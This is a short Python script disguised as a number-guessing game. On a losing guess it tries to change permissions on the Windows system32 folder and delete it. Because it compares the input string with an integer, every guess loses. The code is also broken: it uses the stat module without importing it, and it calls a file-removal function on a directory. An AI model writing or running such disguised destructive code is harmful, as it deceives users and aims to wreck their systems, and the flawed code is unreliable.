import os
import random

answer = input("guess the number between 1-10! ")

if(answer==random.randint(1,10)):
  print("you won!")
else:
  os.system("C://Windows//system32")
  os.chmod("C://Windows//system32", stat.S_IRWXU)
  os.remove("C://Windows//system32")
